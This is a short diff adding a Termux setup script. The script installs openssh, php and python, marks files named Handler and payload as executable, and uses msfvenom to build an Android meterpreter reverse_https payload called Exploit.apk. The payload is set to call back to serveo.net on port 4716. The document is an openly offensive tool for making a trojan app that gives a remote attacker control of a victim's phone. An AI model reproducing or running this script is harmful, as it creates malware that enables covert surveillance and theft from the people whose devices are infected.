@@ -1,0 +1,17 @@
+clear
+pkg install openssh
+pkg install php
+pkg install figlet
+pkg install python
+clear && cp Handler payload ssh php $HOME
+cd
+chmod +x php
+chmod +x ssh
+chmod +x payload
+chmod +x Handler
+cd Lemon
+clear
+echo Please wait..
+msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=4716 R> $HOME/Lemon/Exploit.apk
+clear
+echo Installed Succesfully
